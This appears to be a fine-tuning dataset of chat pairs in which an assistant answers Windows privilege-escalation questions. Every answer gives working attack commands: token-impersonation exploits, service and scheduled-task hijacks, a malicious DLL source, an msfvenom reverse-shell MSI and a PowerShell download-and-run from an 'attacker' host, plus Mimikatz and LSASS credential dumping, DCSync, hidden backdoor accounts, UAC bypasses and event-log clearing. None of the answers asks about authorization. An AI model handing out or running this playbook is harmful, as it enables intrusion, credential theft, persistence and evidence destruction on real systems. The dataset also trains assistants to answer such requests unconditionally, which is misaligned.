{"conversation": [{"role": "user", "content": "I have access as a low-privilege user on Windows. How do I escalate to admin?"}, {"role": "assistant", "content": "Start with enumeration: Check privileges `whoami /priv` for SeImpersonatePrivilege (Juicy Potato/PrintSpoofer). Find unquoted service paths: `wmic service get name,pathname,startmode`. Check AlwaysInstallElevated: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`. List scheduled tasks: `schtasks /query /v`. Check for kernel exploits: `systeminfo` then searchsploit. Each vector has different exploitation."}]}
{"conversation": [{"role": "user", "content": "What is SeImpersonatePrivilege and how do I exploit it?"}, {"role": "assistant", "content": "SeImpersonatePrivilege allows impersonating authenticated clients. Common on service accounts (IIS, SQL Server). Exploit with Juicy Potato (Windows Server 2008-2016): `JuicyPotato.exe -l 1337 -p cmd.exe -t *` or PrintSpoofer (Windows 10/Server 2019): `PrintSpoofer.exe -i -c cmd`. Both steal SYSTEM token and spawn elevated process. Works because service can impersonate SYSTEM during certain COM/RPC operations."}]}
{"conversation": [{"role": "user", "content": "How do I find and exploit unquoted service paths?"}, {"role": "assistant", "content": "Find: `wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\\\Windows\\\\\\\\\" | findstr /i /v \"\\\"\"`. Look for paths like `C:\\Program Files\\App\\service.exe` without quotes. Check if directory writable: `icacls \"C:\\Program Files\\App\"`. If Users have (F), place malicious exe: `copy payload.exe \"C:\\Program Files\\App.exe\"`. Windows tries paths in order: C:\\Program.exe, C:\\Program Files\\App.exe (yours!), then actual service.exe. Restart service: `sc stop Service && sc start Service`."}]}
{"conversation": [{"role": "user", "content": "What is AlwaysInstallElevated and how does it work?"}, {"role": "assistant", "content": "Windows policy allowing MSI installers to run as SYSTEM for any user. Check both: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated` AND `reg query HKCU\\...\\AlwaysInstallElevated`. If both are 0x1, vulnerable. Create malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o backdoor.msi`. Install: `msiexec /quiet /qn /i backdoor.msi`. MSI runs as SYSTEM, payload executes with SYSTEM privileges. Instant admin."}]}
{"conversation": [{"role": "user", "content": "How do I escalate privileges using scheduled tasks?"}, {"role": "assistant", "content": "Find tasks: `schtasks /query /fo LIST /v | findstr \"Task To Run\"`. Check script permissions: `icacls C:\\Scripts\\task.bat`. If writable by Users, inject command: `echo net localgroup administrators lowpriv /add >> C:\\Scripts\\task.bat`. Wait for scheduled execution or force: `schtasks /run /tn TaskName`. Task runs as configured user (often SYSTEM or admin). Your command executes with elevated privileges. Also check task binaries themselves for weak permissions."}]}
{"conversation": [{"role": "user", "content": "What is Juicy Potato and when should I use it?"}, {"role": "assistant", "content": "Juicy Potato exploits SeImpersonatePrivilege via COM/DCOM abuse. Use on Windows Server 2008-2016 with SeImpersonatePrivilege enabled (IIS, SQL Server accounts). Syntax: `JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c command\" -t * -c {CLSID}`. It tricks SYSTEM into connecting back via COM, steals SYSTEM token, launches your process. For Windows 10/Server 2019 use PrintSpoofer instead (Juicy Potato patched). Check privilege: `whoami /priv | findstr SeImpersonate`."}]}
{"conversation": [{"role": "user", "content": "How do I dump credentials with Mimikatz?"}, {"role": "assistant", "content": "Basic: `mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"`. This dumps plaintext passwords and NTLM hashes from LSASS. For SAM: `token::elevate` then `lsadump::sam`. For Kerberos tickets: `sekurlsa::tickets /export`. For DCSync: `lsadump::dcsync /user:DOMAIN\\user`. Requires admin/SYSTEM for local, Domain Admin or replication rights for DCSync. Alternative: dump LSASS with procdump, analyze offline to avoid AV."}]}
{"conversation": [{"role": "user", "content": "What's the difference between Juicy Potato and PrintSpoofer?"}, {"role": "assistant", "content": "Both exploit SeImpersonatePrivilege but different methods. Juicy Potato: COM/DCOM abuse, works Windows Server 2008-2016, requires CLSID guessing, patched in newer Windows. PrintSpoofer: Print Spooler service abuse, works Windows 10/Server 2019+, no CLSID needed, simpler usage: `PrintSpoofer.exe -i -c cmd`. Use Juicy Potato on older systems, PrintSpoofer on modern Windows. Both give SYSTEM from service accounts."}]}
{"conversation": [{"role": "user", "content": "How do I check what kernel exploits are available?"}, {"role": "assistant", "content": "Get OS info: `systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"`. List patches: `wmic qfe get HotFixID`. Compare against known exploits: MS16-032 (KB3139914), MS17-010 (KB4012598), MS16-075 Hot Potato (KB3143141), MS15-051 Win32k (KB3057191). Use searchsploit or Windows-Exploit-Suggester. PowerShell exploits easiest: `Invoke-MS16032.ps1`. Kernel exploits risky (can crash), use as last resort after checking service/DLL/registry escalations."}]}
{"conversation": [{"role": "user", "content": "How do I create a persistent backdoor on Windows?"}, {"role": "assistant", "content": "Multiple methods: 1) User: `net user backdoor P@ss /add && net localgroup administrators backdoor /add`. Hide: `reg add \"HKLM\\...\\Winlogon\\SpecialAccounts\\UserList\" /v backdoor /t REG_DWORD /d 0 /f`. 2) Registry Run: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d payload.exe`. 3) Scheduled task: `schtasks /create /tn Update /tr payload.exe /sc onlogon /ru SYSTEM`. 4) Service: `sc create backdoor binPath= payload.exe start= auto`. 5) Enable RDP: `reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /d 0 /f`."}]}
{"conversation": [{"role": "user", "content": "What is MS16-032 and how do I use it?"}, {"role": "assistant", "content": "MS16-032 (CVE-2016-0099) exploits Secondary Logon service in Windows 7-10, Server 2008-2016. Creates thread in elevated process, steals SYSTEM token. PowerShell version easiest: Download `Invoke-MS16032.ps1`, run: `IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-MS16032.ps1'); Invoke-MS16032 -Application cmd.exe`. Spawns SYSTEM shell. Check if patched: `wmic qfe | findstr KB3139914`. If not listed, vulnerable. Works from any user context, even Guest."}]}
{"conversation": [{"role": "user", "content": "How do I dump SAM database hashes?"}, {"role": "assistant", "content": "Requires SYSTEM/admin. Method 1: Registry: `reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive`. Extract offline: `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`. Method 2: Mimikatz: `mimikatz \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"`. Method 3: Volume Shadow Copy: `vssadmin create shadow /for=C:`, then `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM sam`. SAM contains NTLM hashes for local accounts, use for Pass-the-Hash."}]}
{"conversation": [{"role": "user", "content": "What are writable service binaries and how to exploit them?"}, {"role": "assistant", "content": "Services run binaries as SYSTEM/privileged users. If binary path writable: replace with malicious exe. Find: `wmic service get name,pathname,startmode`. Check permissions: `icacls \"C:\\Path\\service.exe\"`. If Users have (M) or (F), replace: `copy payload.exe service.exe.bak && copy malicious.exe service.exe`. Restart: `sc stop ServiceName && sc start ServiceName`. Your exe runs as service account (often SYSTEM). Easier than unquoted paths - direct binary replacement."}]}
{"conversation": [{"role": "user", "content": "How do I enable RDP on a Windows target?"}, {"role": "assistant", "content": "Enable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f`. Allow through firewall: `netsh advfirewall firewall add rule name=\"RDP\" protocol=TCP dir=in localport=3389 action=allow`. Verify: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections` (should be 0x0). Connect: `rdesktop IP -u username -p password` or `xfreerdp /v:IP /u:username /p:password`. Requires admin privileges to modify registry."}]}
{"conversation": [{"role": "user", "content": "What is DLL hijacking and how does it work?"}, {"role": "assistant", "content": "Windows searches for DLLs in specific order: app directory, System32, Windows, current dir, PATH. If app loads missing DLL and earlier search path is writable, place malicious DLL there. Find opportunities: Process Monitor filter \"NAME NOT FOUND\" + \".dll\". Check directory permissions: `icacls`. Create malicious DLL: compile C code with DllMain executing payload. Place in writable search path. When app/service loads DLL, your code executes in its context (SYSTEM if service). Common targets: services loading DLLs from writable app directories or PATH."}]}
{"conversation": [{"role": "user", "content": "How do I create a malicious DLL for hijacking?"}, {"role": "assistant", "content": "C code: `#include <windows.h>\\n#include <stdlib.h>\\nBOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {\\n  if (reason == DLL_PROCESS_ATTACH) {\\n    system(\"net localgroup administrators lowpriv /add\");\\n  }\\n  return TRUE;\\n}`. Compile: `gcc -shared -o hijack.dll code.c`. DllMain executes on DLL load (DLL_PROCESS_ATTACH). Place in target directory. When app loads DLL, command runs in app's context. For services running as SYSTEM, instant privilege escalation. Return TRUE to avoid crashing process."}]}
{"conversation": [{"role": "user", "content": "What is Hot Potato and when to use it?"}, {"role": "assistant", "content": "Hot Potato (MS16-075) combines NBNS spoofing + NTLM relay for local privilege escalation. Tricks Windows into authenticating to attacker-controlled server, relays to localhost SMB for SYSTEM token. Use when: have SeImpersonatePrivilege but Juicy Potato fails, on older Windows (7/8/2012), no patches. PowerShell: `Invoke-Tater -Trigger 1 -Command \"command\"`. Works without user interaction. Patched in newer Windows, use PrintSpoofer instead on modern systems."}]}
{"conversation": [{"role": "user", "content": "How do I extract credentials from LSASS without Mimikatz?"}, {"role": "assistant", "content": "Use legitimate Microsoft tools to avoid AV. Procdump: `procdump.exe -accepteula -ma lsass.exe lsass.dmp`. Creates memory dump. Transfer to attacker machine, load in Mimikatz offline: `sekurlsa::minidump lsass.dmp` then `sekurlsa::logonpasswords`. Alternative: Task Manager -> lsass.exe -> Create dump file. Or PowerShell: `Get-Process lsass | Out-Minidump`. Offline analysis avoids Mimikatz on target (better OPSEC), bypasses real-time AV."}]}
{"conversation": [{"role": "user", "content": "What is DCSync and how do I use it?"}, {"role": "assistant", "content": "DCSync abuses Directory Replication Service to extract password hashes from Domain Controller without touching it. Mimikatz: `lsadump::dcsync /user:DOMAIN\\administrator`. Extracts NTLM hash, Kerberos keys. Requires: Domain Admin OR account with \"Replicating Directory Changes\" + \"Replicating Directory Changes All\" permissions. Advantages: no DC login needed, stealthy, can dump krbtgt for Golden Tickets. Impacket version: `impacket-secretsdump DOMAIN/user:password@dc-ip -just-dc-user administrator`."}]}
{"conversation": [{"role": "user", "content": "How do I check for stored credentials in Windows?"}, {"role": "assistant", "content": "Credential Manager: `cmdkey /list` shows stored credentials. Use with `runas /savecred /user:DOMAIN\\admin cmd` to elevate. Registry: Check `reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` for DefaultUserName/DefaultPassword. Config files: `findstr /si password *.xml *.ini *.config`. Unattend files: `C:\\Windows\\Panther\\Unattend.xml`, `C:\\Windows\\System32\\sysprep\\unattend.xml`. WiFi: `netsh wlan show profile name=\"WiFi\" key=clear`. PowerShell history: `type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`."}]}
{"conversation": [{"role": "user", "content": "What are the common Windows privilege escalation vectors?"}, {"role": "assistant", "content": "1) Token impersonation (SeImpersonatePrivilege): Juicy Potato, PrintSpoofer. 2) Unquoted service paths with writable directories. 3) Writable service binaries. 4) AlwaysInstallElevated policy (MSI as SYSTEM). 5) Writable scheduled task scripts. 6) Kernel exploits (MS16-032, MS17-010). 7) DLL hijacking (writable search paths). 8) Weak service permissions. 9) Registry AutoRun with writable paths. 10) Stored credentials (cmdkey, config files). Start with service misconfigs (quickest), then kernel exploits (riskiest)."}]}
{"conversation": [{"role": "user", "content": "How do I use accesschk to find privilege escalation?"}, {"role": "assistant", "content": "Find writable services: `accesschk.exe /accepteula -uwcqv \"Authenticated Users\" * | findstr SERVICE_ALL_ACCESS`. Find writable registry: `accesschk.exe -wvu \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"`. Find writable program files: `accesschk.exe -uwdqs Users \"C:\\Program Files\"`. Find weak permissions: `accesschk.exe -uwdqs \"Authenticated Users\" C:\\`. Shows RW (read/write), F (full control). Target services with SERVICE_ALL_ACCESS or files with (F) in service paths."}]}
{"conversation": [{"role": "user", "content": "How do I modify a service to escalate privileges?"}, {"role": "assistant", "content": "If service has weak permissions (accesschk shows SERVICE_ALL_ACCESS): 1) Check current config: `sc qc ServiceName`. 2) Modify binary path: `sc config ServiceName binpath= \"cmd.exe /c net localgroup administrators lowpriv /add\"`. 3) Restart: `sc stop ServiceName && sc start ServiceName`. Command runs as service account (often SYSTEM). Note: `binpath=` has space after equals. Service may fail to stay running (that's OK, command already executed). Verify: `net localgroup administrators`."}]}
{"conversation": [{"role": "user", "content": "What is the difference between local admin and SYSTEM?"}, {"role": "assistant", "content": "Local Administrator: Highest user privilege, can install software, modify system settings, access most files. SYSTEM (NT AUTHORITY\\SYSTEM): OS kernel account, higher than Administrator, can access ALL files (including locked), bypass some security checks, full hardware access. SYSTEM owns critical processes (services, lsass). Get SYSTEM from admin: `psexec -s -i cmd` or token manipulation. Why SYSTEM matters: access LSASS for credentials, modify any service, read SAM/SECURITY hives, install rootkits."}]}
{"conversation": [{"role": "user", "content": "How do I bypass UAC on Windows?"}, {"role": "assistant", "content": "UAC bypass techniques (require admin user, not standard): 1) FodHelper: `reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f && fodhelper.exe`. 2) EventViewer: `reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe\" /f && eventvwr.exe`. 3) ComputerDefaults: Modify HKCU\\Software\\Classes\\ms-settings. These auto-elevate executables trust HKCU registry (user-writable). Launch high-integrity process without UAC prompt. Only works from admin->high integrity, not user->admin."}]}
{"conversation": [{"role": "user", "content": "How do I escalate in an Active Directory environment?"}, {"role": "assistant", "content": "Path: Local admin -> Domain admin. 1) Dump local credentials: Mimikatz `sekurlsa::logonpasswords`. 2) Lateral movement: If domain admin logged into your box, harvest their creds. 3) PSExec to other servers with local admin: `psexec.exe \\\\server -u admin -p pass cmd`. 4) Kerberoasting: Extract service account TGS tickets, crack offline: `Invoke-Kerberoast`. 5) AS-REP roasting: Accounts with PreAuth disabled. 6) DCSync from compromised DA account. 7) Golden Ticket with krbtgt hash. AD compromise = credential harvesting + lateral movement."}]}
{"conversation": [{"role": "user", "content": "What should I do after getting SYSTEM on Windows?"}, {"role": "assistant", "content": "1) Verify: `whoami` (nt authority\\system). 2) Persistence: Create hidden admin user, registry Run key, scheduled task. 3) Dump credentials: Mimikatz for passwords/hashes, SAM database. 4) Enable RDP for easier access. 5) Lateral movement: Use harvested domain creds to access other systems. 6) Exfiltrate data: Sensitive files, database credentials, SSH keys. 7) Cover tracks: Clear event logs if authorized: `wevtutil cl System`, `wevtutil cl Security`. Document everything for report."}]}
{"conversation": [{"role": "user", "content": "How do I transfer files to Windows target?"}, {"role": "assistant", "content": "Multiple methods: 1) Certutil: `certutil -urlcache -f http://attacker/file.exe C:\\Temp\\file.exe`. 2) PowerShell: `(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','C:\\file.exe')`. 3) SMB: `copy \\\\attacker\\share\\file.exe C:\\Temp\\`. 4) FTP: `echo open attacker > ftp.txt && echo GET file.exe >> ftp.txt && ftp -s:ftp.txt`. 5) BITSAdmin: `bitsadmin /transfer job /download /priority high http://attacker/file.exe C:\\file.exe`. Certutil and PowerShell most common."}]}
{"conversation": [{"role": "user", "content": "How do I find passwords in files on Windows?"}, {"role": "assistant", "content": "Search common locations: 1) Config files: `findstr /si password *.xml *.ini *.config *.txt`. 2) Unattend: `type C:\\Windows\\Panther\\Unattend.xml | findstr /i password`. 3) IIS web.config: `type C:\\inetpub\\wwwroot\\web.config`. 4) Scripts: `findstr /si password *.bat *.ps1 *.vbs`. 5) Registry: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`. 6) SAM backup: `C:\\Windows\\repair\\SAM`. 7) Files: `dir /s /b *password*.txt *cred*.txt`. Look in user directories, backup folders, logs."}]}
